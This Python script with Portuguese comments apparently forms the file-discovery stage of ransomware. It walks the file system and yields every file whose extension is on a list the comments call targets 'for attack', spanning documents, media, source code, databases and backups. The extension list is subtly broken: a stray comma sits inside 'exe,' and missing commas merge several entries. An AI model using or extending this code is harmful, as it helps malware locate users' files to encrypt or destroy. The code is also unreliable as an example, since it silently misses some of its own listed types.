#!/usr/bin/python3.6
#coding: utf-8

import os

def discover(initial_path):

    # Possiveis extensões de arquivos para ataque
    extensions = [
        'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img'  # Arquivos do Sitema
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # imagens
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # Audios
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Vídeos
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
        # OpenOffice, Adobe, Latex, Markdown, etc
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
        'yml', 'yaml', 'json', 'xml', 'csv',  # dados estruturados e config
        'db', 'sql', 'dbf', 'mdb', 'iso',  # bancos de dados e imagens de disco

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css'  # tecnologias web
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # Código fonte C e C++
        'java', 'class', 'jar'  # Códigos fonte Java
        'ps', 'bat', 'vb',  # Scripts de sistemas windows
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # Scripts de sistemas unix
        'go', 'py', 'pyc', 'bf', 'coffee',  # Outros tipos de códigos fonte

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Arquivos compactados e Backups
    ]

    # Percorre o sistema a partir do diretório alvo inicial.
    for dirpath, dirs, files in os.walk(initial_path):
        for arq in files:
            # Gera o caminho absoluto (abspath) compativel com todos os sistemas UNIX usando o 
            # diretorio 'dirpath' e o arquivo atual 'arq'
            abspath = os.path.abspath(os.path.join(dirpath, arq))
            # Pega a extensão do arquivo atual:
            ext = abspath.split('.')[-1]

            if ext in extensions:
                # 'Retorna' o caminho completo do arquivo se a extensão dele estiver na lista.
                yield abspath

# Não será executado externamente:
# Esse condicional verifica se o arquivo atual é executado diretamente (inicialmente).
if __name__ == '__main__':
    x = discover(os.getcwd())
    for k in x:
        print(k)
